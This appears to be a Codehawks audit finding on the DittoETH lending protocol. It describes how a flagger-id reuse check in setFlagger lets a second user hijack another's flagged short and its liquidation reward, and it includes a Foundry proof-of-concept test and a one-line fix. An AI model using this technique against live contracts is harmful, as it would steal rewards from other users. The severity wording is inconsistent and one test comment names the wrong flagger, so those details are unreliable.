---
tags:
  - lang/solidity
  - platform/codehawks
  - has/github
  - has/poc
  - severity/high
  - sector/lending
protocol: "[[DittoETH]]"
auditors:
  - "[[serialcoder]]"
genome:
  - "[[liquidation-logic]]"
  - "[[reward-theft]]"
  - "[[liquidation-underwater]]"
  - "[[reward-accounting]]"
---
# Flag can be overriden by another user

- id: 27465
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: serialcoder (Codehawks)
- source: N/A

## Summary


This bug report is about an issue in a code which allows a new flagger to override the flagger id of an existing flagged short. This means that the first flagger will be in loss of the spent gas and expected reward. 

The code responsible for this issue is located at the following GitHub link: https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L394. The vulnerability is in the `setFlagger` function which allows a new flagger to reuse `flaggerHint` flag id after `LibAsset.firstLiquidationTime` has passed after flagId has been updated. This allows a new flagger to take control over the liquidation of the flagged short by finding some other liquidatable short and passing in the flagId of the previous flagger as the `flagHint`.

The severity of this bug is medium risk. The recommended solution is to update the check to `secondLiquidationTime`.

## Details

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L394">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L394</a>


## Vulnerability Details
The `setFlagger` function allows a new flagger to reuse `flaggerHint` flag id after `LibAsset.firstLiquidationTime` has passed after flagId has been updated. 
```solidity
    function setFlagger(
        STypes.ShortRecord storage short,
        address cusd,
        uint16 flaggerHint
    ) internal {

           if (flagStorage.g_flaggerId == 0) {
            address flaggerToReplace = s.flagMapping[flaggerHint];

            // @audit if timeDiff > firstLiquidationTime, replace the flagger address

            uint256 timeDiff = flaggerToReplace != address(0)
                ? LibOrders.getOffsetTimeHours()
                    - s.assetUser[cusd][flaggerToReplace].g_updatedAt
                : 0;
            //@dev re-use an inactive flaggerId
            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {
                delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;
                short.flaggerId = flagStorage.g_flaggerId = flaggerHint;

            // more code

            s.flagMapping[short.flaggerId] = msg.sender;
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L377-L404C13

Since the previous flagger can only liquidate the flagged short after `LibAsset.firstLiquidationTime` has passed, the flagged short will be unliquidated till that time. Both the ability to flag the short for first flagger and the ability to replace the first flagger starts at the same instant. This allows a new flagger to take control over the liquidation of the flagged short by finding some other liquidatable short and passing in the flagId of the previous flagger as the `flagHint`.

### POC Test
```diff
diff --git a/test/MarginCallFlagShort.t.sol b/test/MarginCallFlagShort.t.sol
index 906657e..3d7f985 100644
--- a/test/MarginCallFlagShort.t.sol
+++ b/test/MarginCallFlagShort.t.sol
@@ -169,6 +169,90 @@ contract MarginCallFlagShortTest is MarginCallHelper {
         assertEq(diamond.getFlagger(shortRecord.flaggerId), extra);
     }
 
+    function test_FlaggerId_Override_Before_Call() public {
+        address flagger1 = address(77);
+        address flagger2 = address(78);
+
+        vm.label(flagger1, "flagger1");
+        vm.label(flagger2, "flagger2");
+
+        //create first short
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord1 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);
+
+        assertEq(diamond.getFlaggerIdCounter(), 1);
+        assertEq(shortRecord1.flaggerId, 0);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), address(0));
+
+        //flag first short
+        setETH(2500 ether);
+        vm.prank(flagger1);
+        diamond.flagShort(asset, sender, shortRecord1.id, Constants.HEAD);
+        shortRecord1 = diamond.getShortRecord(asset, sender, shortRecord1.id);
+
+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord1.flaggerId, 1);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), flagger1);
+
+        skip(TEN_HRS_PLUS);
+        setETH(2500 ether);
+
+        //attempting direct liquidation by flagger2 fails since only allowed to flagger1
+
+        //add ask order to liquidate against
+        fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        uint16[] memory shortHintArray = setShortHintArray();
+        vm.prank(flagger2);
+        vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+
+        //cancel the previously created ask order
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        //reset
+        setETH(4000 ether);
+
+        //create another short
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord2 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID + 1);
+
+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord2.flaggerId, 0);
+        assertEq(diamond.getFlagger(shortRecord2.flaggerId), address(0));
+
+        //flag second short by providing flagger id of flagger1. this resets the flagger id
+        setETH(2500 ether);
+        vm.prank(flagger2);
+        diamond.flagShort(
+            asset, sender, Constants.SHORT_STARTING_ID + 1, uint16(shortRecord1.flaggerId)
+        );
+        shortRecord2 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID + 1);
+
+        //flagger1 has been replaced
+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord2.flaggerId, 1);
+        assertEq(diamond.getFlagger(shortRecord2.flaggerId), flagger2);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), flagger2);
+
+        //ask to liquidate against
+        fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        //now flagger1 cannot liquidate shortRecord1
+        vm.prank(flagger1);
+        vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+
+        //but flagger1 can
+        vm.prank(flagger2);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+    }
+
     function test_FlagShort_FlaggerId_Recycling_AfterIncreaseCollateral() public {
         createAndFlagShort();
 

```

## Impact
First flagger will be in loss of the spent gas and expected reward.

## Recommendations
Update the check to `secondLiquidationTime`
```diff
diff --git a/contracts/libraries/LibShortRecord.sol b/contracts/libraries/LibShortRecord.sol
index 7c5ecc3..c8736b0 100644
--- a/contracts/libraries/LibShortRecord.sol
+++ b/contracts/libraries/LibShortRecord.sol
@@ -391,7 +391,7 @@ library LibShortRecord {
                     - s.assetUser[cusd][flaggerToReplace].g_updatedAt
                 : 0;
             //@dev re-use an inactive flaggerId
-            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {
+            if (timeDiff > LibAsset.secondLiquidationTime(cusd)) {
                 delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;
                 short.flaggerId = flagStorage.g_flaggerId = flaggerHint;
             } else if (s.flaggerIdCounter < type(uint16).max) {

```
